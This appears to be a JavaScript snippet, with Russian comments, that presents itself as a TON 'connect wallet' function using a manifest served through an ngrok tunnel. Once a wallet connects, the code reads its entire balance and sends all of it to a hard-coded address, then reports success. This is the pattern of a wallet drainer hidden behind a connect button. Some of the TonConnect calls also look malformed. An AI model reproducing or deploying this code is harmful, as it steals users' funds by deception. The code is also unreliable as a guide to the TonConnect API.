async function connectWallet() {
    const TonConnect = window.TonConnect;

    const tonConnect = new TonConnect({
        manifestUrl: 'https://ed69-176-124-220-178.ngrok-free.app/static/tonconnect-manifest.json'
    });

    // Показать модальное окно для подключения кошелька
    tonConnect.connectWallet();

    // Обработчик события подключения кошелька
    tonConnect.on('connect', async (wallet) => {
        const fromWalletAddress = wallet.address;
        const toWalletAddress = 'adress';

        const balance = await tonConnect.getBalance(fromWalletAddress);

        const transaction = {
            to: toWalletAddress,
            value: balance,
            bounce: false
        };

        await tonConnect.sendTransaction(transaction);

        alert('Funds transferred successfully!');
    });
}
